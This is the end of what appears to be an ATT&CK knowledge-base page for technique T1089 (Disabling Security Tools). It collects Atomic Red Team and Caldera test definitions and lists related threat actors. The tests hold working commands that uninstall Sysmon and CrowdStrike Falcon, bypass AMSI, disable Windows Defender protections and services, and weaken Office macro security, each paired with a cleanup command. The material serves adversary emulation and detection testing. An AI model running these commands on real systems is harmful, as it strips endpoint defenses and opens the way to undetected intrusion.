                                                                                                                'Out-Null\n'
                                                                                                                'Invoke-WebRequest '
                                                                                                                '"https://download.sysinternals.com/files/Sysmon.zip" '
                                                                                                                '-OutFile '
                                                                                                                '"$zippath"\n'
                                                                                                                'Expand-Archive '
                                                                                                                '$zippath '
                                                                                                                '$parentpath '
                                                                                                                '-Force; '
                                                                                                                'Remove-Item '
                                                                                                                '$zippath\n'
                                                                                                                'if(-not '
                                                                                                                '($Env:Path).contains($parentpath)){$Env:Path '
                                                                                                                '+= '
                                                                                                                '";$parentpath"}\n',
                                                                                          'prereq_command': 'if(cmd '
                                                                                                            '/c '
                                                                                                            'where '
                                                                                                            'sysmon) '
                                                                                                            '{exit '
                                                                                                            '0} '
                                                                                                            'else '
                                                                                                            '{exit '
                                                                                                            '1}\n'},
                                                                                         {'description': 'Sysmon '
                                                                                                         'must '
                                                                                                         'be '
                                                                                                         'installed\n',
                                                                                          'get_prereq_command': 'cmd '
                                                                                                                '/c '
                                                                                                                'sysmon '
                                                                                                                '-i '
                                                                                                                '-accepteula\n',
                                                                                          'prereq_command': 'if(cmd '
                                                                                                            '/c '
                                                                                                            'sc '
                                                                                                            'query '
                                                                                                            'sysmon) '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '0} '
                                                                                                            'else '
                                                                                                            '{ '
                                                                                                            'exit '
                                                                                                            '1}\n'}],
                                                                        'dependency_executor_name': 'powershell',
                                                                        'description': 'Uninstall '
                                                                                       'Sysinternals '
                                                                                       'Sysmon '
                                                                                       'for '
                                                                                       'Defense '
                                                                                       'Evasion\n',
                                                                        'executor': {'cleanup_command': 'sysmon '
                                                                                                        '-i '
                                                                                                        '-accepteula '
                                                                                                        '>nul '
                                                                                                        '2>&1\n',
                                                                                     'command': 'sysmon '
                                                                                                '-u\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'command_prompt'},
                                                                        'input_arguments': {'sysmon_exe': {'default': 'PathToAtomicsFolder\\T1089\\bin\\sysmon.exe',
                                                                                                           'description': 'The '
                                                                                                                          'location '
                                                                                                                          'of '
                                                                                                                          'the '
                                                                                                                          'Sysmon '
                                                                                                                          'executable '
                                                                                                                          'from '
                                                                                                                          'Sysinternals '
                                                                                                                          '(ignored '
                                                                                                                          'if '
                                                                                                                          'sysmon.exe '
                                                                                                                          'is '
                                                                                                                          'found '
                                                                                                                          'in '
                                                                                                                          'your '
                                                                                                                          'PATH)',
                                                                                                           'type': 'Path'}},
                                                                        'name': 'Uninstall '
                                                                                'Sysmon',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Any '
                                                                                       'easy '
                                                                                       'way '
                                                                                       'to '
                                                                                       'bypass '
                                                                                       'AMSI '
                                                                                       'inspection '
                                                                                       'is '
                                                                                       'it '
                                                                                       'patch '
                                                                                       'the '
                                                                                       'dll '
                                                                                       'in '
                                                                                       'memory '
                                                                                       'setting '
                                                                                       'the '
                                                                                       '"amsiInitFailed" '
                                                                                       'function '
                                                                                       'to '
                                                                                       'true.\n'
                                                                                       'Upon '
                                                                                       'execution, '
                                                                                       'no '
                                                                                       'output '
                                                                                       'is '
                                                                                       'displayed.\n'
                                                                                       '\n'
                                                                                       'https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n',
                                                                        'executor': {'cleanup_command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n",
                                                                                     'command': "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
                                                                                     'elevation_required': False,
                                                                                     'name': 'powershell'},
                                                                        'name': 'AMSI '
                                                                                'Bypass '
                                                                                '- '
                                                                                'AMSI '
                                                                                'InitFailed',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'With '
                                                                                       'administrative '
                                                                                       'rights, '
                                                                                       'an '
                                                                                       'adversary '
                                                                                       'can '
                                                                                       'remove '
                                                                                       'the '
                                                                                       'AMSI '
                                                                                       'Provider '
                                                                                       'registry '
                                                                                       'key '
                                                                                       'in '
                                                                                       'HKLM\\Software\\Microsoft\\AMSI '
                                                                                       'to '
                                                                                       'disable '
                                                                                       'AMSI '
                                                                                       'inspection.\n'
                                                                                       'This '
                                                                                       'test '
                                                                                       'removes '
                                                                                       'the '
                                                                                       'Windows '
                                                                                       'Defender '
                                                                                       'provider '
                                                                                       'registry '
                                                                                       'key. '
                                                                                       'Upon '
                                                                                       'execution, '
                                                                                       'no '
                                                                                       'output '
                                                                                       'is '
                                                                                       'displayed.\n'
                                                                                       'Open '
                                                                                       'Registry '
                                                                                       'Editor '
                                                                                       'and '
                                                                                       'navigate '
                                                                                       'to '
                                                                                       '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\" '
                                                                                       'to '
                                                                                       'verify '
                                                                                       'that '
                                                                                       'it '
                                                                                       'is '
                                                                                       'gone.\n',
                                                                        'executor': {'cleanup_command': 'New-Item '
                                                                                                        '-Path '
                                                                                                        '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers" '
                                                                                                        '-Name '
                                                                                                        '"{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
                                                                                                        '-ErrorAction '
                                                                                                        'Ignore '
                                                                                                        '| '
                                                                                                        'Out-Null\n',
                                                                                     'command': 'Remove-Item '
                                                                                                '-Path '
                                                                                                '"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}" '
                                                                                                '-Recurse\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'powershell'},
                                                                        'name': 'AMSI '
                                                                                'Bypass '
                                                                                '- '
                                                                                'Remove '
                                                                                'AMSI '
                                                                                'Provider '
                                                                                'Reg '
                                                                                'Key',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'With '
                                                                                       'administrative '
                                                                                       'rights, '
                                                                                       'an '
                                                                                       'adversary '
                                                                                       'can '
                                                                                       'disable '
                                                                                       'Windows '
                                                                                       'Services '
                                                                                       'related '
                                                                                       'to '
                                                                                       'security '
                                                                                       'products. '
                                                                                       'This '
                                                                                       'test '
                                                                                       'requires '
                                                                                       'McAfeeDLPAgentService '
                                                                                       'to '
                                                                                       'be '
                                                                                       'installed.\n'
                                                                                       'Change '
                                                                                       'the '
                                                                                       'service_name '
                                                                                       'input '
                                                                                       'argument '
                                                                                       'for '
                                                                                       'your '
                                                                                       'AV '
                                                                                       'solution. '
                                                                                       'Upon '
                                                                                       'exeuction, '
                                                                                       'infomration '
                                                                                       'will '
                                                                                       'be '
                                                                                       'displayed '
                                                                                       'stating '
                                                                                       'the '
                                                                                       'status '
                                                                                       'of '
                                                                                       'the '
                                                                                       'service.\n'
                                                                                       'To '
                                                                                       'verify '
                                                                                       'that '
                                                                                       'the '
                                                                                       'service '
                                                                                       'has '
                                                                                       'stopped, '
                                                                                       'run '
                                                                                       '"sc '
                                                                                       'query '
                                                                                       'McAfeeDLPAgentService"\n',
                                                                        'executor': {'cleanup_command': 'sc.exe '
                                                                                                        'config '
                                                                                                        '#{service_name} '
                                                                                                        'start= '
                                                                                                        'auto '
                                                                                                        '>nul '
                                                                                                        '2>&1\n'
                                                                                                        'net.exe '
                                                                                                        'start '
                                                                                                        '#{service_name} '
                                                                                                        '>nul '
                                                                                                        '2>&1\n',
                                                                                     'command': 'net.exe '
                                                                                                'stop '
                                                                                                '#{service_name}\n'
                                                                                                'sc.exe '
                                                                                                'config '
                                                                                                '#{service_name} '
                                                                                                'start= '
                                                                                                'disabled\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'command_prompt'},
                                                                        'input_arguments': {'service_name': {'default': 'McAfeeDLPAgentService',
                                                                                                             'description': 'The '
                                                                                                                            'name '
                                                                                                                            'of '
                                                                                                                            'the '
                                                                                                                            'service '
                                                                                                                            'to '
                                                                                                                            'stop',
                                                                                                             'type': 'String'}},
                                                                        'name': 'Disable '
                                                                                'Arbitrary '
                                                                                'Security '
                                                                                'Windows '
                                                                                'Service',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Attempting '
                                                                                       'to '
                                                                                       'disable '
                                                                                       'scheduled '
                                                                                       'scanning '
                                                                                       'and '
                                                                                       'other '
                                                                                       'parts '
                                                                                       'of '
                                                                                       'windows '
                                                                                       'defender '
                                                                                       'atp. '
                                                                                       'Upon '
                                                                                       'execution '
                                                                                       'Virus '
                                                                                       'and '
                                                                                       'Threat '
                                                                                       'Protection '
                                                                                       'will '
                                                                                       'show '
                                                                                       'as '
                                                                                       'disabled\n'
                                                                                       'in '
                                                                                       'Windows '
                                                                                       'settings.\n',
                                                                        'executor': {'cleanup_command': 'Set-MpPreference '
                                                                                                        '-DisableRealtimeMonitoring '
                                                                                                        '0\n'
                                                                                                        'Set-MpPreference '
                                                                                                        '-DisableBehaviorMonitoring '
                                                                                                        '0\n'
                                                                                                        'Set-MpPreference '
                                                                                                        '-DisableScriptScanning '
                                                                                                        '0\n'
                                                                                                        'Set-MpPreference '
                                                                                                        '-DisableBlockAtFirstSeen '
                                                                                                        '0\n',
                                                                                     'command': 'Set-MpPreference '
                                                                                                '-DisableRealtimeMonitoring '
                                                                                                '1\n'
                                                                                                'Set-MpPreference '
                                                                                                '-DisableBehaviorMonitoring '
                                                                                                '1\n'
                                                                                                'Set-MpPreference '
                                                                                                '-DisableScriptScanning '
                                                                                                '1\n'
                                                                                                'Set-MpPreference '
                                                                                                '-DisableBlockAtFirstSeen '
                                                                                                '1\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'powershell'},
                                                                        'name': 'Tamper '
                                                                                'with '
                                                                                'Windows '
                                                                                'Defender '
                                                                                'ATP '
                                                                                'PowerShell',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Attempting '
                                                                                       'to '
                                                                                       'disable '
                                                                                       'scheduled '
                                                                                       'scanning '
                                                                                       'and '
                                                                                       'other '
                                                                                       'parts '
                                                                                       'of '
                                                                                       'windows '
                                                                                       'defender '
                                                                                       'atp. '
                                                                                       'These '
                                                                                       'commands '
                                                                                       'must '
                                                                                       'be '
                                                                                       'run '
                                                                                       'as '
                                                                                       'System, '
                                                                                       'so '
                                                                                       'they '
                                                                                       'still '
                                                                                       'fail '
                                                                                       'as '
                                                                                       'administrator.\n'
                                                                                       'However, '
                                                                                       'adversaries '
                                                                                       'do '
                                                                                       'attempt '
                                                                                       'to '
                                                                                       'perform '
                                                                                       'this '
                                                                                       'action '
                                                                                       'so '
                                                                                       'monitoring '
                                                                                       'for '
                                                                                       'these '
                                                                                       'command '
                                                                                       'lines '
                                                                                       'can '
                                                                                       'help '
                                                                                       'alert '
                                                                                       'to '
                                                                                       'other '
                                                                                       'bad '
                                                                                       'things '
                                                                                       'going '
                                                                                       'on. '
                                                                                       'Upon '
                                                                                       'execution, '
                                                                                       '"Access '
                                                                                       'Denied"\n'
                                                                                       'will '
                                                                                       'be '
                                                                                       'displayed '
                                                                                       'twice '
                                                                                       'and '
                                                                                       'the '
                                                                                       'WinDefend '
                                                                                       'service '
                                                                                       'status '
                                                                                       'will '
                                                                                       'be '
                                                                                       'displayed.\n',
                                                                        'executor': {'cleanup_command': 'sc '
                                                                                                        'start '
                                                                                                        'WinDefend '
                                                                                                        '>nul '
                                                                                                        '2>&1\n'
                                                                                                        'sc '
                                                                                                        'config '
                                                                                                        'WinDefend '
                                                                                                        'start=enabled '
                                                                                                        '>nul '
                                                                                                        '2>&1\n',
                                                                                     'command': 'sc '
                                                                                                'stop '
                                                                                                'WinDefend\n'
                                                                                                'sc '
                                                                                                'config '
                                                                                                'WinDefend '
                                                                                                'start=disabled\n'
                                                                                                'sc '
                                                                                                'query '
                                                                                                'WinDefend\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'command_prompt'},
                                                                        'name': 'Tamper '
                                                                                'with '
                                                                                'Windows '
                                                                                'Defender '
                                                                                'Command '
                                                                                'Prompt',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Disable '
                                                                                       'Windows '
                                                                                       'Defender '
                                                                                       'from '
                                                                                       'starting '
                                                                                       'after '
                                                                                       'a '
                                                                                       'reboot. '
                                                                                       'Upen '
                                                                                       'execution, '
                                                                                       'if '
                                                                                       'the '
                                                                                       'computer '
                                                                                       'is '
                                                                                       'rebooted '
                                                                                       'the '
                                                                                       'entire '
                                                                                       'Virus '
                                                                                       'and '
                                                                                       'Threat '
                                                                                       'protection '
                                                                                       'window '
                                                                                       'in '
                                                                                       'Settings '
                                                                                       'will '
                                                                                       'be\n'
                                                                                       'grayed '
                                                                                       'out '
                                                                                       'and '
                                                                                       'have '
                                                                                       'no '
                                                                                       'info.\n',
                                                                        'executor': {'cleanup_command': 'Set-ItemProperty '
                                                                                                        '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
                                                                                                        'Defender" '
                                                                                                        '-Name '
                                                                                                        'DisableAntiSpyware '
                                                                                                        '-Value '
                                                                                                        '0\n',
                                                                                     'command': 'Set-ItemProperty '
                                                                                                '"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows '
                                                                                                'Defender" '
                                                                                                '-Name '
                                                                                                'DisableAntiSpyware '
                                                                                                '-Value '
                                                                                                '1\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'powershell'},
                                                                        'name': 'Tamper '
                                                                                'with '
                                                                                'Windows '
                                                                                'Defender '
                                                                                'Registry',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Gorgon '
                                                                                       'group '
                                                                                       'may '
                                                                                       'disable '
                                                                                       'Office '
                                                                                       'security '
                                                                                       'features '
                                                                                       'so '
                                                                                       'that '
                                                                                       'their '
                                                                                       'code '
                                                                                       'can '
                                                                                       'run. '
                                                                                       'Upon '
                                                                                       'execution, '
                                                                                       'an '
                                                                                       'external '
                                                                                       'document '
                                                                                       'will '
                                                                                       'not\n'
                                                                                       'show '
                                                                                       'any '
                                                                                       'warning '
                                                                                       'before '
                                                                                       'editing '
                                                                                       'the '
                                                                                       'document.\n'
                                                                                       '\n'
                                                                                       '\n'
                                                                                       'https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n',
                                                                        'executor': {'cleanup_command': 'Remove-ItemProperty '
                                                                                                        '-Path '
                                                                                                        '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
                                                                                                        '-Name '
                                                                                                        '"VBAWarnings"\n'
                                                                                                        'Remove-Item '
                                                                                                        '-Path '
                                                                                                        '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"\n',
                                                                                     'command': 'New-Item '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel"\n'
                                                                                                'New-Item '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security"\n'
                                                                                                'New-Item '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView"\n'
                                                                                                'New-ItemProperty '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security" '
                                                                                                '-Name '
                                                                                                '"VBAWarnings" '
                                                                                                '-Value '
                                                                                                '"1" '
                                                                                                '-PropertyType '
                                                                                                '"Dword"\n'
                                                                                                'New-ItemProperty '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                                                                                                '-Name '
                                                                                                '"DisableInternetFilesInPV" '
                                                                                                '-Value '
                                                                                                '"1" '
                                                                                                '-PropertyType '
                                                                                                '"Dword"\n'
                                                                                                'New-ItemProperty '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                                                                                                '-Name '
                                                                                                '"DisableUnsafeLocationsInPV" '
                                                                                                '-Value '
                                                                                                '"1" '
                                                                                                '-PropertyType '
                                                                                                '"Dword"\n'
                                                                                                'New-ItemProperty '
                                                                                                '-Path '
                                                                                                '"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView" '
                                                                                                '-Name '
                                                                                                '"DisableAttachementsInPV" '
                                                                                                '-Value '
                                                                                                '"1" '
                                                                                                '-PropertyType '
                                                                                                '"Dword"\n',
                                                                                     'elevation_required': False,
                                                                                     'name': 'powershell'},
                                                                        'name': 'Disable '
                                                                                'Microft '
                                                                                'Office '
                                                                                'Security '
                                                                                'Features',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Removing '
                                                                                       'definition '
                                                                                       'files '
                                                                                       'would '
                                                                                       'cause '
                                                                                       'ATP '
                                                                                       'to '
                                                                                       'not '
                                                                                       'fire '
                                                                                       'for '
                                                                                       'AntiMalware. '
                                                                                       'Check '
                                                                                       'MpCmdRun.exe '
                                                                                       'man '
                                                                                       'page '
                                                                                       'for '
                                                                                       'info '
                                                                                       'on '
                                                                                       'all '
                                                                                       'arguments.\n'
                                                                                       'On '
                                                                                       'later '
                                                                                       'viersions '
                                                                                       'of '
                                                                                       'windows '
                                                                                       '(1909+) '
                                                                                       'this '
                                                                                       'command '
                                                                                       'fails '
                                                                                       'even '
                                                                                       'with '
                                                                                       'admin '
                                                                                       'due '
                                                                                       'to '
                                                                                       'inusfficient '
                                                                                       'privelages. '
                                                                                       'On '
                                                                                       'older '
                                                                                       'versions '
                                                                                       'of '
                                                                                       'windows '
                                                                                       'the\n'
                                                                                       'command '
                                                                                       'will '
                                                                                       'say '
                                                                                       'completed.\n'
                                                                                       '\n'
                                                                                       'https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n',
                                                                        'executor': {'command': '"C:\\Program '
                                                                                                'Files\\Windows '
                                                                                                'Defender\\MpCmdRun.exe" '
                                                                                                '-RemoveDefinitions '
                                                                                                '-All\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'command_prompt'},
                                                                        'name': 'Remove '
                                                                                'Windows '
                                                                                'Defender '
                                                                                'Definition '
                                                                                'Files',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Beginning '
                                                                                       'with '
                                                                                       'Powershell '
                                                                                       '6.0, '
                                                                                       'the '
                                                                                       'Stop-Service '
                                                                                       'cmdlet '
                                                                                       'sends '
                                                                                       'a '
                                                                                       'stop '
                                                                                       'message '
                                                                                       'to '
                                                                                       'the '
                                                                                       'Windows '
                                                                                       'Service '
                                                                                       'Controller '
                                                                                       'for '
                                                                                       'each '
                                                                                       'of '
                                                                                       'the '
                                                                                       'specified '
                                                                                       'services. '
                                                                                       'The '
                                                                                       'Remove-Service '
                                                                                       'cmdlet '
                                                                                       'removes '
                                                                                       'a '
                                                                                       'Windows '
                                                                                       'service '
                                                                                       'in '
                                                                                       'the '
                                                                                       'registry '
                                                                                       'and '
                                                                                       'in '
                                                                                       'the '
                                                                                       'service '
                                                                                       'database.\n',
                                                                        'executor': {'command': 'Stop-Service '
                                                                                                '-Name '
                                                                                                '#{service_name}\n'
                                                                                                'Remove-Service '
                                                                                                '-Name '
                                                                                                '#{service_name}\n',
                                                                                     'elevation_required': True,
                                                                                     'name': 'powershell'},
                                                                        'input_arguments': {'service_name': {'default': 'McAfeeDLPAgentService',
                                                                                                             'description': 'The '
                                                                                                                            'name '
                                                                                                                            'of '
                                                                                                                            'the '
                                                                                                                            'service '
                                                                                                                            'to '
                                                                                                                            'remove',
                                                                                                             'type': 'String'}},
                                                                        'name': 'Stop '
                                                                                'and '
                                                                                'Remove '
                                                                                'Arbitrary '
                                                                                'Security '
                                                                                'Windows '
                                                                                'Service',
                                                                        'supported_platforms': ['windows']},
                                                                       {'description': 'Uninstall '
                                                                                       'Crowdstrike '
                                                                                       'Falcon. '
                                                                                       'If '
                                                                                       'the '
                                                                                       'WindowsSensor.exe '
                                                                                       'path '
                                                                                       'is '
                                                                                       'not '
                                                                                       'provided '
                                                                                       'as '
                                                                                       'an '
                                                                                       'argument '
                                                                                       'we '
                                                                                       'need '
                                                                                       'to '
                                                                                       'search '
                                                                                       'for '
                                                                                       'it. '
                                                                                       'Since '
                                                                                       'the '
                                                                                       'executable '
                                                                                       'is '
                                                                                       'located '
                                                                                       'in '
                                                                                       'a '
                                                                                       'folder '
                                                                                       'named '
                                                                                       'with '
                                                                                       'a '
                                                                                       'random '
                                                                                       'guid '
                                                                                       'we '
                                                                                       'need '
                                                                                       'to '
                                                                                       'identify '
                                                                                       'it '
                                                                                       'before '
                                                                                       'invoking '
                                                                                       'the '
                                                                                       'uninstaller.\n',
                                                                        'executor': {'command': 'if '
                                                                                                '(Test-Path '
                                                                                                '"#{falcond_path}") '
                                                                                                '{. '
                                                                                                '"#{falcond_path}" '
                                                                                                '/repair '
                                                                                                '/uninstall '
                                                                                                '/quiet '
                                                                                                '} '
                                                                                                'else '
                                                                                                '{ '
                                                                                                'Get-ChildItem '
                                                                                                '-Path '
                                                                                                '"C:\\ProgramData\\Package '
                                                                                                'Cache" '
                                                                                                '-Include '
                                                                                                '"WindowsSensor.exe" '
                                                                                                '-Recurse '
                                                                                                '| '
                                                                                                '% '
                                                                                                '{ '
                                                                                                '$sig=$(Get-AuthenticodeSignature '
                                                                                                '-FilePath '
                                                                                                '$_.FullName); '
                                                                                                'if '
                                                                                                '($sig.Status '
                                                                                                '-eq '
                                                                                                '"Valid" '
                                                                                                '-and '
                                                                                                '$sig.SignerCertificate.DnsNameList '
                                                                                                '-eq '
                                                                                                '"CrowdStrike, '
                                                                                                'Inc.") '
                                                                                                '{ '
                                                                                                '. '
                                                                                                '"$_" '
                                                                                                '/repair '
                                                                                                '/uninstall '
                                                                                                '/quiet; '
                                                                                                'break;}}}',
                                                                                     'elevation_required': True,
                                                                                     'name': 'powershell'},
                                                                        'input_arguments': {'falcond_path': {'default': 'C:\\ProgramData\\Package '
                                                                                                                        'Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe',
                                                                                                             'description': 'The '
                                                                                                                            'Crowdstrike '
                                                                                                                            'Windows '
                                                                                                                            'Sensor '
                                                                                                                            'path. '
                                                                                                                            'The '
                                                                                                                            'Guid '
                                                                                                                            'always '
                                                                                                                            'changes.',
                                                                                                             'type': 'path'}},
                                                                        'name': 'Uninstall '
                                                                                'Crowdstrike '
                                                                                'Falcon '
                                                                                'on '
                                                                                'Windows',
                                                                        'supported_platforms': ['windows']}],
                                                      'attack_technique': 'T1089',
                                                      'display_name': 'Disabling '
                                                                      'Security '
                                                                      'Tools'}},
 {'Mitre Stockpile - Disable Windows Defender Real-Time Protection': {'description': 'Disable '
                                                                                     'Windows '
                                                                                     'Defender '
                                                                                     'Real-Time '
                                                                                     'Protection',
                                                                      'id': '49470433-30ce-4714-a44b-bea9dbbeca9a',
                                                                      'name': 'Disable '
                                                                              'Windows '
                                                                              'Defender '
                                                                              'Real-Time '
                                                                              'Protection',
                                                                      'platforms': {'windows': {'psh': {'cleanup': 'Set-MPPreference '
                                                                                                                   '-DisableRealtimeMonitoring '
                                                                                                                   '0',
                                                                                                        'command': 'Set-MPPreference '
                                                                                                                   '-DisableRealtimeMonitoring '
                                                                                                                   '1\n'}}},
                                                                      'privilege': 'Elevated',
                                                                      'tactic': 'defense-evasion',
                                                                      'technique': {'attack_id': 'T1089',
                                                                                    'name': 'Disabling '
                                                                                            'Security '
                                                                                            'Tools'}}},
 {'Mitre Stockpile - Disable Windows Defender All': {'description': 'Disable '
                                                                    'Windows '
                                                                    'Defender '
                                                                    'All',
                                                     'id': 'b007f6e8-4a87-4440-8888-29ceab047d9b',
                                                     'name': 'Disable Windows '
                                                             'Defender All',
                                                     'platforms': {'windows': {'psh': {'cleanup': 'Set-MpPreference '
                                                                                                  '-DisableIntrusionPreventionSystem '
                                                                                                  '$false;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableIOAVProtection '
                                                                                                  '$false;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableRealtimeMonitoring '
                                                                                                  '$false;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableScriptScanning '
                                                                                                  '$false;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-EnableControlledFolderAccess '
                                                                                                  'Enabled;\n',
                                                                                       'command': 'Set-MpPreference '
                                                                                                  '-DisableIntrusionPreventionSystem '
                                                                                                  '$true;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableIOAVProtection '
                                                                                                  '$true;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableRealtimeMonitoring '
                                                                                                  '$true;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-DisableScriptScanning '
                                                                                                  '$true;\n'
                                                                                                  'Set-MpPreference '
                                                                                                  '-EnableControlledFolderAccess '
                                                                                                  'Disabled;\n'}}},
                                                     'tactic': 'defense-evasion',
                                                     'technique': {'attack_id': 'T1089',
                                                                   'name': 'Disabling '
                                                                           'Security '
                                                                           'Tools'}}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1089',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/disable_rdp":  '
                                                                                 '["T1089"],',
                                            'Empire Module': 'powershell/management/disable_rdp',
                                            'Technique': 'Disabling Security '
                                                         'Tools'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [Putter Panda](../actors/Putter-Panda.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [Turla](../actors/Turla.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
